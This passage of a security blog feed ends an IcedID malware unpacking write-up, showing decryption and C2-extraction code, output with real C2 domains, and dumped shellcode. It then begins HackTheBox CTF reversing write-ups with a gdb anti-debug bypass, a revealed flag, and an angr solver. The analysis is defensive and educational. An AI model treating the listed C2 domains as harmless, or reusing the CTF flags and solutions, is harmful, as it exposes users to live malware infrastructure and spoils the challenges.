</span></span><span class="line"><span class="cl">    <span class="n">cipher</span> <span class="o">=</span> <span class="n">ARC4</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">dec</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># dexor</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">apply_xor</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">dec</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">dec</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="n">dec</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">x</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)])</span> <span class="o">-</span> <span class="n">dec</span><span class="p">[</span><span class="n">x</span> <span class="o">+</span> <span class="mi">1</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Quick check we got valid data</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># ref: quicklz format: https://github.com/ReSpeak/quicklz/blob/master/Format.md</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># DWORD at decrypted data+1 should be the length</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">u32</span><span class="p">(</span><span class="n">dec</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="mi">5</span><span class="p">])</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">quicklz</span><span class="o">.</span><span class="n">decompress</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">dec</span><span class="p">))</span>
</span></span></code></pre></div><p>The XOR pass doesn&rsquo;t seem to always be applied, so we try with and without.</p>
<h1 id="3-c2-extraction">3. C2 Extraction</h1>
<p>Extracting the C2 address and campain ID from the unpacked PE is pretty straight forward.</p>
<p>We just need to XOR 2 32 bytes data blob (from the <code>.d</code> section) with each other:</p>
<p><img src="c2_xor.png" alt="C2 XOR"></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">extract_c2</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">pe</span> <span class="o">=</span> <span class="n">pefile</span><span class="o">.</span><span class="n">PE</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">get_section</span><span class="p">(</span><span class="n">pe</span><span class="p">,</span> <span class="s2">&#34;.d&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">get_data</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">data</span><span class="p">[:</span><span class="mh">0x20</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">conf</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mh">0x40</span><span class="p">:</span><span class="mh">0x40</span><span class="o">+</span><span class="mh">0x20</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">conf</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">camp</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">[:</span><span class="mi">4</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="n">c2</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;campaign_id&#39;</span><span class="p">:</span> <span class="n">camp</span><span class="p">,</span> <span class="s1">&#39;c2&#39;</span><span class="p">:</span> <span class="n">c2</span><span class="p">}</span>
</span></span></code></pre></div><h1 id="4-showcase">4. Showcase</h1>
<pre tabindex="0"><code>% ./icedid_stage1_unpack.py 0581f0bf260a11a5662d58b99a82ec756c9365613833bce8f102ec1235a7d4f7.bin
got data blob: 0x4c04b bytes
found potential rc4 code: 0x1800026b3
 * found caller (0x180001b77 -&gt; 0x180001bc0)
emulating from 0x180001b77 to 0x180001bc0 (max iter = 3000)
found 1 potential keys: [b&#39;\xc6B\xc7\x11&#39;]
trying key b&#39;\xc6B\xc7\x11&#39; / xor=True
decrypted data: 0x4c042 bytes
found 5 elements
- dumped 0581f0bf260a11a5662d58b99a82ec756c9365613833bce8f102ec1235a7d4f7.bin.extracted.0
- dumped 0581f0bf260a11a5662d58b99a82ec756c9365613833bce8f102ec1235a7d4f7.bin.extracted.1
- dumped 0581f0bf260a11a5662d58b99a82ec756c9365613833bce8f102ec1235a7d4f7.bin.extracted.2
    looks like a PE... {&#39;campaign_id&#39;: 109932505, &#39;c2&#39;: b&#39;ilekvoyn.com&#39;}
- dumped 0581f0bf260a11a5662d58b99a82ec756c9365613833bce8f102ec1235a7d4f7.bin.extracted.3
- dumped 0581f0bf260a11a5662d58b99a82ec756c9365613833bce8f102ec1235a7d4f7.bin.extracted.4
</code></pre><pre tabindex="0"><code>% ./icedid_stage1_unpack.py samples/17aeebe6c1098a312074b0fdeae6f97339f2d64d66a2b07496bfc1373694a4e3.bin
got data blob: 0x3820 bytes
found potential rc4 code: 0x180003fc1
 * found caller (0x1800011c3 -&gt; 0x180001507)
emulating from 0x1800011c3 to 0x180001507 (max iter = 3000)
found 1 potential keys: [b&#39;k\xfe\xfa\x8b&#39;]
trying key b&#39;k\xfe\xfa\x8b&#39; / xor=True
trying key b&#39;k\xfe\xfa\x8b&#39; / xor=False
decrypted data: 0x5714 bytes
found 4 elements
- dumped samples/17aeebe6c1098a312074b0fdeae6f97339f2d64d66a2b07496bfc1373694a4e3.bin.extracted.0
- dumped samples/17aeebe6c1098a312074b0fdeae6f97339f2d64d66a2b07496bfc1373694a4e3.bin.extracted.1
- dumped samples/17aeebe6c1098a312074b0fdeae6f97339f2d64d66a2b07496bfc1373694a4e3.bin.extracted.2
    looks like a PE... {&#39;campaign_id&#39;: 429479428, &#39;c2&#39;: b&#39;arelyevennot.top&#39;}
- dumped samples/17aeebe6c1098a312074b0fdeae6f97339f2d64d66a2b07496bfc1373694a4e3.bin.extracted.3
</code></pre><pre tabindex="0"><code>% ./icedid_stage1_unpack.py samples/12a692718d21b8dc3a8d5a2715688f533f1a978ee825163d41de11847039393d.bin
got data blob: 0x16064 bytes
skip 0x6442458550: too many predecessors (4)
found potential rc4 code: 0x180003bbf
 * found caller (0x1800016bf -&gt; 0x180001980)
emulating from 0x1800016bf to 0x180001980 (max iter = 3000)
hooking addr=0x18000184b size=7
hooking addr=0x180001c19 size=7
hooking addr=0x180001c09 size=7
hooking addr=0x180001bdc size=7
found 1 potential keys: [b&#39;,u\xe2I&#39;]
trying key b&#39;,u\xe2I&#39; / xor=True
decrypted data: 0x179f7 bytes
found 5 elements
- dumped samples/12a692718d21b8dc3a8d5a2715688f533f1a978ee825163d41de11847039393d.bin.extracted.0
- dumped samples/12a692718d21b8dc3a8d5a2715688f533f1a978ee825163d41de11847039393d.bin.extracted.1
- dumped samples/12a692718d21b8dc3a8d5a2715688f533f1a978ee825163d41de11847039393d.bin.extracted.2
    looks like a PE... {&#39;campaign_id&#39;: 3068011852, &#39;c2&#39;: b&#39;yolneanz.com&#39;}
- dumped samples/12a692718d21b8dc3a8d5a2715688f533f1a978ee825163d41de11847039393d.bin.extracted.3
- dumped samples/12a692718d21b8dc3a8d5a2715688f533f1a978ee825163d41de11847039393d.bin.extracted.4
</code></pre><p>The extracted data blobs are:</p>
<ul>
<li>2 shellcodes</li>
<li>1 DLL</li>
<li>1 or 2 images:</li>
</ul>
<pre tabindex="0"><code>% file 0581f0bf260a11a5662d58b99a82ec756c9365613833bce8f102ec1235a7d4f7.bin.extracted.*
0581f0bf260a11a5662d58b99a82ec756c9365613833bce8f102ec1235a7d4f7.bin.extracted.0: data
0581f0bf260a11a5662d58b99a82ec756c9365613833bce8f102ec1235a7d4f7.bin.extracted.1: data
0581f0bf260a11a5662d58b99a82ec756c9365613833bce8f102ec1235a7d4f7.bin.extracted.2: PE32+ executable (DLL) (GUI) x86-64, for MS Windows
0581f0bf260a11a5662d58b99a82ec756c9365613833bce8f102ec1235a7d4f7.bin.extracted.3: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, baseline, precision 8, 800x600, components 3
0581f0bf260a11a5662d58b99a82ec756c9365613833bce8f102ec1235a7d4f7.bin.extracted.4: JPEG image data, Exif Standard: [TIFF image data, big-endian, direntries=7, software=Adobe Photoshop 21.2 (Windows), datetime=2021-03-25T08:49:36+07:00], baseline, precision 8, 800x800, components 3
</code></pre><h1 id="5-conclusion">5. Conclusion</h1>
<p>While it is certainly not the most optimal method to unpack the samples, it was a fun exercise to do.</p>
<p>The full code is available here: <a href="https://github.com/matthw/icedid_stage1_unpack">https://github.com/matthw/icedid_stage1_unpack</a>.</p>
]]></content>
		</item>
		
		<item>
			<title>HackTheBox CTF Cyber Apocalypse 2022: Intergalactic Chase (Reverse)</title>
			<link>https://matth.dmz42.org/posts/2022/hackthebox-ctf-cyber-apocalypse-2022-intergalactic-chase-rev/</link>
			<pubDate>Sat, 21 May 2022 21:15:40 +0200</pubDate>
			
			<guid>https://matth.dmz42.org/posts/2022/hackthebox-ctf-cyber-apocalypse-2022-intergalactic-chase-rev/</guid>
			<description>Hack The Box was hosting a CTF event and we played together with some friends.
Here are some writeups for some of the reversing challenges i solved.
There&amp;rsquo;s often shortcuts taken and (un)educated guesses involved, some ugly Z3 and angr for additionnal fun&amp;hellip;
0. TOC Without A Trace (413 solves)
Teleport (307 solves)
Rebuilding (463 solves)
Nuts and Bolts (60 solves)
Shuffleme (28 solves)
Snake Code (281 solves)
Freaky Forum Interception (32 solves)</description>
			<content type="html"><![CDATA[<p><a href="https://www.hackthebox.com">Hack The Box</a> was hosting a CTF event and we played together with some friends.</p>
<p>Here are some writeups for some of the reversing challenges i solved.</p>
<p>There&rsquo;s often shortcuts taken and (un)educated guesses involved, some ugly Z3 and angr for additionnal fun&hellip;</p>
<h1 id="0-toc">0. TOC</h1>
<ol>
<li>
<p><a href="#1-without-a-trace">Without A Trace</a> (413 solves)</p>
</li>
<li>
<p><a href="#2-teleport">Teleport</a> (307 solves)</p>
</li>
<li>
<p><a href="#3-rebuilding">Rebuilding</a> (463 solves)</p>
</li>
<li>
<p><a href="#4-nuts-and-bolts">Nuts and Bolts</a> (60 solves)</p>
</li>
<li>
<p><a href="#5-shuffleme">Shuffleme</a> (28 solves)</p>
</li>
<li>
<p><a href="#6-snake-code">Snake Code</a> (281 solves)</p>
</li>
<li>
<p><a href="#7-freaky-forum-interception">Freaky Forum Interception</a> (32 solves)</p>
</li>
<li>
<p><a href="#8-indefinite">Indefinite</a> (58 solves)</p>
</li>
</ol>
<h1 id="1-without-a-trace">1. Without A Trace</h1>
<p>Original file <a href="rev_without_a_trace.zip">here</a>.</p>
<p>The <code>check_password</code> function calls <code>ptrace(PTRACE_ME)</code> and uses the return value as part of the flag decryption loop.</p>
<p>It&rsquo;s a classic antidebug trick, as if the process is already being debugged, the ptrace call will fail (a process can only be traced once) and the decrypted result will be garbage.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">ulong</span> <span class="nf">check_password</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">param_1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">long</span> <span class="n">ptrace_result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">undefined4</span> <span class="n">extraout_var</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">uint</span> <span class="n">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">undefined8</span> <span class="n">stack_string</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">undefined8</span> <span class="n">local_30</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">undefined8</span> <span class="n">local_28</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">undefined2</span> <span class="n">local_20</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">undefined</span> <span class="n">local_1e</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">ptrace_result</span> <span class="o">=</span> <span class="nf">ptrace</span><span class="p">(</span><span class="n">PTRACE_TRACEME</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">stack_string</span> <span class="o">=</span> <span class="mh">0x1c4b0d0b043d2b37</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">local_30</span> <span class="o">=</span> <span class="mh">0x200f0a204c12204c</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">local_28</span> <span class="o">=</span> <span class="mh">0x184f18200a204b1d</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">local_20</span> <span class="o">=</span> <span class="mh">0x24f</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">local_1e</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">n</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">n</span> <span class="o">&lt;</span> <span class="mh">0x1a</span><span class="p">;</span> <span class="n">n</span> <span class="o">=</span> <span class="n">n</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="p">(</span><span class="n">byte</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="o">&amp;</span><span class="n">stack_string</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)(</span><span class="kt">int</span><span class="p">)</span><span class="n">n</span><span class="p">)</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl">             <span class="o">*</span><span class="p">(</span><span class="n">byte</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="o">&amp;</span><span class="n">stack_string</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)(</span><span class="kt">int</span><span class="p">)</span><span class="n">n</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="n">ptrace_result</span> <span class="o">+</span> <span class="mh">0x7fU</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/* strcmp */</span>
</span></span><span class="line"><span class="cl">    <span class="n">iVar1</span> <span class="o">=</span> <span class="nf">strcmp</span><span class="p">(</span><span class="n">param_1</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">stack_string</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">CONCAT44</span><span class="p">(</span><span class="n">extraout_var</span><span class="p">,</span><span class="n">iVar1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffff00</span> <span class="o">|</span> <span class="p">(</span><span class="n">ulong</span><span class="p">)(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>One way of going around that is to manipulate the <code>ptrace</code> return value to simulate a sucessful call.</p>
<p>We can just break at <code>strcmp</code>afterwards and dump the string&hellip;</p>
<pre tabindex="0"><code>% gdb ./without_a_trace
pwndbg: loaded 198 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from ./without_a_trace...
(No debugging symbols found in ./without_a_trace)
pwndbg&gt; break ptrace
Breakpoint 1 at 0x730
pwndbg&gt; run
Starting program: ./without_a_trace
[+] Primary Mothership Tracking Panel
[X] Unusual activity detected
 |-------] Unrecognised login location: Earth
[X] Please verify your identity by entering your password &gt; dsdsdsdsdsds

Breakpoint 1, ptrace (request=PTRACE_TRACEME) at ../sysdeps/unix/sysv/linux/ptrace.c:30

pwndbg&gt; finish
pwndbg&gt; set $rax=0
pwndbg&gt; break strcmp
Breakpoint 2 at 0x7ffff7f282a0: file ../sysdeps/x86_64/multiarch/strcmp-avx2.S, line 106.
pwndbg&gt; c
Continuing.
pwndbg&gt; x/s $rsi
0x7fffffffe340:	&#34;HTB{tr4c3_m3_up_b4_u_g0g0}&#34;
</code></pre><h1 id="2-teleport">2. Teleport</h1>
<p>Original files <a href="rev_teleport.zip">here</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span><span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">undefined8</span> <span class="n">uVar2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">uint</span> <span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">strncpy</span><span class="p">(</span><span class="n">INPUT</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="mi">100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x2b</span><span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">code</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">PTR_FUN_00303020</span><span class="p">)[(</span><span class="kt">int</span><span class="p">)</span><span class="n">i</span><span class="p">])();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">iVar1</span> <span class="o">=</span> <span class="nf">_setjmp</span><span class="p">((</span><span class="n">__jmp_buf_tag</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">DAT_003031a0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">100</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Looks good to me!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">!=</span> <span class="mh">0x65</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
</span></span><span class="line"><span class="cl">                <span class="nf">longjmp</span><span class="p">((</span><span class="n">__jmp_buf_tag</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_00303300</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">iVar1</span> <span class="o">*</span> <span class="mi">200</span><span class="p">),</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Something</span><span class="se">\&#39;</span><span class="s">s wrong...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">uVar2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Missing password&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">uVar2</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">uVar2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>we want to reach the <code>Looks good to me</code>, just throw it angr and reuse some old script&hellip;</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">angr</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">claripy</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">logging</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># by default, angr will set PIE binary base at 0x400000</span>
</span></span><span class="line"><span class="cl"><span class="n">BASE_ADDR</span> <span class="o">=</span> <span class="mh">0x400000</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rebase</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">BASE_ADDR</span> <span class="o">+</span> <span class="n">addr</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">angr</span><span class="o">.</span><span class="n">Project</span><span class="p">(</span><span class="s1">&#39;teleport&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># 64 bytes argv[1]</span>
</span></span><span class="line"><span class="cl">    <span class="n">argv1</span> <span class="o">=</span> <span class="n">claripy</span><span class="o">.</span><span class="n">BVS</span><span class="p">(</span><span class="s2">&#34;argv1&#34;</span><span class="p">,</span> <span class="mi">8</span><span class="o">*</span><span class="mi">64</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">initial_state</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">factory</span><span class="o">.</span><span class="n">entry_state</span><span class="p">(</span><span class="n">args</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;./teleport&#34;</span><span class="p">,</span> <span class="n">argv1</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">sm</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">factory</span><span class="o">.</span><span class="n">simulation_manager</span><span class="p">(</span><span class="n">initial_state</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># 0x1732 = good boy</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#  00101732 48 8d 3d ec 00 00 00     LEA                  argc,[s_Looks_good_to_me!_00101825]</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#  00101739 e8 a2 f2 ff ff           CALL                 &lt;EXTERNAL&gt;::puts</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># 0x1740 = nop</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#  00101740 48 8d 3d f0 00 00 00     LEA                  argc,[s_Something&#39;s_wrong..._00101837]</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#  00101747 e8 94 f2 ff ff           CALL                 &lt;EXTERNAL&gt;::puts</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">sm</span><span class="o">.</span><span class="n">explore</span><span class="p">(</span><span class="n">find</span><span class="o">=</span><span class="n">rebase</span><span class="p">(</span><span class="mh">0x1732</span><span class="p">),</span> <span class="n">avoid</span><span class="o">=</span><span class="n">rebase</span><span class="p">(</span><span class="mh">0x1740</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="nb">len</span><span class="p">(</span><span class="n">sm</span><span class="o">.</span><span class="n">found</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;no solution&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">found</span> <span class="o">=</span> <span class="n">sm</span><span class="o">.</span><span class="n">found</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">solution</span> <span class="o">=</span> <span class="n">found</span><span class="o">.</span><span class="n">solver</span><span class="o">.</span><span class="n">eval</span><span class="p">(</span><span class="n">argv1</span><span class="p">,</span> <span class="n">cast_to</span><span class="o">=</span><span class="nb">bytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">solution</span> <span class="o">=</span> <span class="n">solution</span><span class="p">[:</span><span class="n">solution</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">solution</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">([</span><span class="n">main</span><span class="p">()])</span>
</span></span></code></pre></div><pre tabindex="0"><code>% python solve02.py
WARNING | 2022-05-21 10:11:38,350 | cle.loader | The main binary is a position-independent executable. It is being loaded with a base address of 0x400000.
WARNING | 2022-05-21 10:11:39,063 | angr.storage.memory_mixins.default_filler_mixin | The program is accessing memory with an unspecified value. This could indicate unwanted behavior.
WARNING | 2022-05-21 10:11:39,064 | angr.storage.memory_mixins.default_filler_mixin | angr will cope with this by generating an unconstrained symbolic variable and continuing. You can resolve this by:
WARNING | 2022-05-21 10:11:39,064 | angr.storage.memory_mixins.default_filler_mixin | 1) setting a value to the initial state
WARNING | 2022-05-21 10:11:39,064 | angr.storage.memory_mixins.default_filler_mixin | 2) adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold null
WARNING | 2022-05-21 10:11:39,064 | angr.storage.memory_mixins.default_filler_mixin | 3) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages.
WARNING | 2022-05-21 10:11:39,064 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff4c with 4 unconstrained bytes referenced from 0x400a25 (PLT.__cxa_finalize+0x15 in teleport (0xa25))
WARNING | 2022-05-21 10:11:39,147 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7ffffffffff0000 with 28 unconstrained bytes referenced from 0x78a620 (strncpy+0x0 in libc.so.6 (0x8a620))
